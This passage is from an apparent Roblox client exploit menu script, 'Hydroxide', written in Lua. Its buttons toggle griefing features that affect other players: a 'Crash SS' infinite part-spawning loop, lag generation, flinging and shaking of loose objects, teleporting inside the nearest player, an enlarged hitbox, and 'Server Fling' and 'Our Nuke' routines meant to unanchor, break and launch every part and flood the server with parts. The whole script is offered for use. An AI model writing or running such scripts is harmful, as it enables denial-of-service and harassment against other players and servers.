            if dist <= auraRadius then
                local dir = (obj.Position - hrp.Position).Unit
                obj.Velocity = dir * auraForce
            end
        end
    end
end)

-- =========================
-- CRASH SS
-- =========================

local crashSSBtn = AddButton(playerPage, "Crash SS", function()
    while true do
        local part = Instance.new("Part")
        part.Parent = workspace
        part.Shape = Enum.PartType.Ball
        part.Size = Vector3.new(10, 10, 10)
        part.Anchored = true
        part.CFrame = CFrame.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
    end
end)

-- =========================
-- LAG
-- =========================

local lagBtn = AddButton(playerPage, "Lag", function()
    local part = Instance.new("Part")
    part.Parent = workspace
    part.Shape = Enum.PartType.Ball
    part.Size = Vector3.new(1000, 1000, 1000)
    part.Anchored = true
    part.CFrame = CFrame.new(0, 0, 0)
end)
-- =========================
-- SPAZ LOOSE OBJECTS
-- =========================

task.wait(0.25)

local spazObjects = false
local spazPower = 60 -- how strong the spaz is (increase if needed)

local spazBtn = AddButton(playerPage, "Spaz Objects: OFF", function()
    spazObjects = not spazObjects
    spazBtn.Text = "Spaz Objects: " .. (spazObjects and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not spazObjects then return end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then
            -- don't spaz your own character
            if not obj:IsDescendantOf(LocalPlayer.Character) then

                -- random physics chaos
                obj.AssemblyLinearVelocity = Vector3.new(
                    (math.random(-100, 100) / 100) * spazPower,
                    (math.random(-100, 100) / 100) * spazPower,
                    (math.random(-100, 100) / 100) * spazPower
                )

                obj.AssemblyAngularVelocity = Vector3.new(
                    (math.random(-100, 100) / 100) * spazPower,
                    (math.random(-100, 100) / 100) * spazPower,
                    (math.random(-100, 100) / 100) * spazPower
                )
            end
        end
    end
end)

-- =========================
-- EARTHQUAKE LOOSE OBJECTS
-- =========================

task.wait(0.25)

local earthquake = false
local quakePower = 20 -- increase for stronger earthquake

local quakeBtn = AddButton(playerPage, "Earthquake: OFF", function()
    earthquake = not earthquake
    quakeBtn.Text = "Earthquake: " .. (earthquake and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not earthquake then return end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then
            -- don't affect your own character
            if not obj:IsDescendantOf(LocalPlayer.Character) then

                -- earthquake style shaking (horizontal + vertical)
                obj.AssemblyLinearVelocity = Vector3.new(
                    (math.random(-100, 100) / 100) * quakePower,   -- left/right shake
                    (math.random(-50, 50) / 100) * quakePower,     -- slight up/down shake
                    (math.random(-100, 100) / 100) * quakePower    -- forward/back shake
                )

                -- slight rotational wobble
                obj.AssemblyAngularVelocity = Vector3.new(
                    (math.random(-50, 50) / 100) * quakePower,
                    (math.random(-50, 50) / 100) * quakePower,
                    (math.random(-50, 50) / 100) * quakePower
                )
            end
        end
    end
end)
-- =========================
-- ZERO GRAVITY LOOSE OBJECTS
-- =========================

task.wait(0.25)

local zeroGravity = false
local floatPower = 4 -- upwards force strength (tweak if needed)

local zeroBtn = AddButton(playerPage, "Zero Gravity: OFF", function()
    zeroGravity = not zeroGravity
    zeroBtn.Text = "Zero Gravity: " .. (zeroGravity and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not zeroGravity then return end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then

            -- don't affect your own character parts
            if not obj:IsDescendantOf(LocalPlayer.Character) then

                -- cancel gravity + float up slightly
                obj.AssemblyLinearVelocity = Vector3.new(
                    0,
                    floatPower, -- gentle upward force (removes gravity effect)
                    0
                )

                -- remove rotation for clean drifting
                obj.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end
end)

-- =========================
-- NAME TAG + PLATFORM
-- =========================

task.wait(0.25)

local showTags = false

local tagBtn = AddButton(playerPage, "Platform Tags: OFF", function()
    showTags = not showTags
    tagBtn.Text = "Platform Tags: " .. (showTags and "ON" or "OFF")
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function makeTag(plr)
    if plr.Character and plr.Character:FindFirstChild("Head") then

        -- remove old tag
        if plr.Character.Head:FindFirstChild("PlatformTag") then
            plr.Character.Head.PlatformTag:Destroy()
        end

        local tag = Instance.new("BillboardGui")
        tag.Name = "PlatformTag"
        tag.Adornee = plr.Character.Head
        tag.Size = UDim2.new(4, 0, 1, 0)
        tag.StudsOffset = Vector3.new(0, 2.5, 0)
        tag.AlwaysOnTop = true
        tag.Parent = plr.Character.Head

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1, 1, 1)
        label.TextScaled = true
        label.Font = Enum.Font.GothamBold
        label.Parent = tag

        -- platform detector
        local platform = plr.OsPlatform or "Unknown"

        label.Text = plr.DisplayName .. "\n[" .. platform .. "]"
    end
end

-- update on respawn
Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        task.wait(0.5)
        if showTags then makeTag(plr) end
    end)
end)

-- update existing
for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= LocalPlayer then
        plr.CharacterAdded:Connect(function()
            task.wait(0.5)
            if showTags then makeTag(plr) end
        end)
    end
end

-- heartbeat refresh while ON
RunService.Heartbeat:Connect(function()
    if not showTags then return end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            makeTag(plr)
        end
    end
end)
-- =========================
-- SPIN IN NEAREST PLAYER
-- =========================

task.wait(0.25)

local spinInNearest = false
local spinSpeed = 40 -- spin speed

local spinNearestBtn = AddButton(playerPage, "Spin Nearest: OFF", function()
    spinInNearest = not spinInNearest
    spinNearestBtn.Text = "Spin Nearest: " .. (spinInNearest and "ON" or "OFF")
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function getNearestPlayer()
    local closest
    local shortestDist = math.huge
    local myChar = LocalPlayer.Character
    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end

    local myPos = myChar.HumanoidRootPart.Position

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist < shortestDist then
                shortestDist = dist
                closest = plr
            end
        end
    end

    return closest
end

RunService.Heartbeat:Connect(function(dt)
    if not spinInNearest then return end

    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart

    -- find nearest target
    local target = getNearestPlayer()
    if not target then return end

    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
    if not targetHRP then return end

    -- teleport your HRP inside their body
    hrp.CFrame = targetHRP.CFrame

    -- spin while inside them
    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, spinSpeed * dt, 0)
end)

-- =========================
-- BODY SPAZ + BIG HITBOX
-- =========================

task.wait(0.25)

local bodySpaz = false
local spazPower = 40 -- how strong the shaking is
local hitboxSize = Vector3.new(10, 10, 10) -- size of big hitbox

local spazBtn = AddButton(playerPage, "Body Spaz: OFF", function()
    bodySpaz = not bodySpaz
    spazBtn.Text = "Body Spaz: " .. (bodySpaz and "ON" or "OFF")
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

RunService.Heartbeat:Connect(function()
    if not bodySpaz then return end

    local char = LocalPlayer.Character
    if not char then return end

    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    -- =========================
    -- BIGGER HITBOX
    -- =========================
    hrp.Size = hitboxSize
    hrp.Massless = true
    hrp.CanCollide = true

    -- make sure hitbox stays enabled
    if hrp:FindFirstChildOfClass("SpecialMesh") then
        hrp:FindFirstChildOfClass("SpecialMesh"):Destroy()
    end

    -- =========================
    -- BODY SPAZ (violent shaking)
    -- =========================
    hrp.AssemblyLinearVelocity = Vector3.new(
        math.random(-spazPower, spazPower),
        math.random(-spazPower, spazPower),
        math.random(-spazPower, spazPower)
    )

    hrp.AssemblyAngularVelocity = Vector3.new(
        math.random(-spazPower, spazPower),
        math.random(-spazPower, spazPower),
        math.random(-spazPower, spazPower)
    )
end)

-- =========================
-- AUDIO PLAYER
-- =========================

task.wait(0.25)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Create audio object
local sound = Instance.new("Sound")
sound.Name = "MenuMusicPlayer"
sound.Volume = 1
sound.Looped = true
sound.Parent = workspace

local audioUI -- will be created when button pressed

local function createAudioUI()
    if audioUI then return end

    audioUI = Instance.new("ScreenGui")
    audioUI.Name = "AudioMenu"
    audioUI.ResetOnSpawn = false
    audioUI.Parent = PlayerGui

    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    frame.Size = UDim2.new(0, 260, 0, 160)
    frame.Position = UDim2.new(0.5, -130, 0.5, -80)
    frame.Parent = audioUI

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.fromRGB(45,45,45)
    title.Text = "Audio Player"
    title.TextColor3 = Color3.new(1,1,1)
    title.Parent = frame

    local input = Instance.new("TextBox")
    input.PlaceholderText = "Enter Music ID"
    input.Size = UDim2.new(1, -20, 0, 30)
    input.Position = UDim2.new(0, 10, 0, 40)
    input.BackgroundColor3 = Color3.fromRGB(50,50,50)
    input.TextColor3 = Color3.new(1,1,1)
    input.Parent = frame

    local playBtn = Instance.new("TextButton")
    playBtn.Text = "Play"
    playBtn.Size = UDim2.new(0.5, -15, 0, 30)
    playBtn.Position = UDim2.new(0, 10, 0, 80)
    playBtn.BackgroundColor3 = Color3.fromRGB(0,120,0)
    playBtn.TextColor3 = Color3.new(1,1,1)
    playBtn.Parent = frame

    local stopBtn = Instance.new("TextButton")
    stopBtn.Text = "Stop"
    stopBtn.Size = UDim2.new(0.5, -15, 0, 30)
    stopBtn.Position = UDim2.new(0.5, 5, 0, 80)
    stopBtn.BackgroundColor3 = Color3.fromRGB(120,0,0)
    stopBtn.TextColor3 = Color3.new(1,1,1)
    stopBtn.Parent = frame

    playBtn.MouseButton1Down:Connect(function()
        local id = tonumber(input.Text)
        if id then
            sound.SoundId = "rbxassetid://" .. id
            sound:Play()
        end
    end)

    stopBtn.MouseButton1Down:Connect(function()
        sound:Stop()
    end)
end

local audioBtn = AddButton(playerPage, "Audio Player", function()
    createAudioUI()
end)

-- =========================
-- SERVER FLING NUKER / UNANCHOR EVERYTHING
-- =========================
-- Server-sided destruction: Unanchors ALL parts, takes ownership, flings with INSANE power!

task.wait(0.25)

local serverFling = false
local flingPower = 100000  -- RELLY STRONG - yeets to infinity

local flingBtn = AddButton(playerPage, "Server Fling: OFF", function()
    serverFling = not serverFling
    flingBtn.Text = "Server Fling: " .. (serverFling and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not serverFling then return end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj:IsDescendantOf(LocalPlayer.Character) then
            pcall(function()
                -- SERVER-SIDED: Take ownership → destroy → server owns
                obj:BreakJoints()  -- Break all welds/joints
                obj:SetNetworkOwner(LocalPlayer)  -- Client owns briefly
                obj.Anchored = false  -- UNANCHOR EVERYTHING
                obj.CanCollide = false  -- No collisions = pure chaos
                
                -- INSANE server-replicated flings (X/Z random, Y=UP TO SPACE)
                obj.AssemblyLinearVelocity = Vector3.new(
                    math.random(-flingPower, flingPower),     -- X: sideways madness
                    math.random(flingPower * 2, flingPower * 3),  -- Y: YEET TO MOON
                    math.random(-flingPower, flingPower)      -- Z: forward/back oblivion
                )
                
                -- SPIN LIKE HELICOPTERS FROM HELL
                obj.AssemblyAngularVelocity = Vector3.new(
                    math.random(-flingPower / 10, flingPower / 10),
                    math.random(-flingPower / 10, flingPower / 10),
                    math.random(-flingPower / 10, flingPower / 10)
                )
                
                obj:SetNetworkOwner(nil)  -- Give back to SERVER = replicates to ALL
            end)
        end
    end
end)

-- =========================
-- OUR CUSTOM SERVER KILLER 2025
-- Lag + Fling + Crash (you immune)
-- =========================

local nukeActive = false
local nukeBtn = AddButton(playerPage, "Our Nuke: OFF", function()
    nukeActive = not nukeActive
    nukeBtn.Text = "Our Nuke: " .. (nukeActive and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not nukeActive then return end

    spawn(function()
        while nukeActive and task.wait() do
            for i = 1, 30 do  -- spam 30 parts per frame = instant death
                spawn(function()
                    local p = Instance.new("Part")
                    p.Size = Vector3.new(50, 50, 50)
                    p.Transparency = 1
                    p.Anchored = false
                    p.CanCollide = false
                    p.CFrame = CFrame.new(0, 99999, 0) -- spawn in sky
                    p.Parent = workspace

                    -- Take ownership then release to server
                    pcall(function() p:SetNetworkOwner(nil) end)

                    -- INSANE velocity + spin
                    p.AssemblyLinearVelocity = Vector3.new(
                        math.random(-99999, 99999),
                        math.random(50000, 150000),
                        math.random(-99999, 99999)
                    )
                    p.AssemblyAngularVelocity = Vector3.new(
                        math.random(-1000, 1000),
                        math.random(-1000, 1000),
                        math.random(-1000, 1000)
                    )

                    -- Break everything it touches
                    p.Touched:Connect(function(hit)
                        if hit and hit.Parent then
                            pcall(function() hit:BreakJoints() end)
                            pcall(function() hit.Anchored = false end)
                        end
                    end)
                end)
            end
        end
    end)
end)
-- =========================
-- FINAL TOUCHES
-- =========================

print("Hydroxide loaded — menu ready.")

pcall(function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Hydroxide";
        Text = "Menu loaded automatically.";
        Duration = 4;
    })
end)
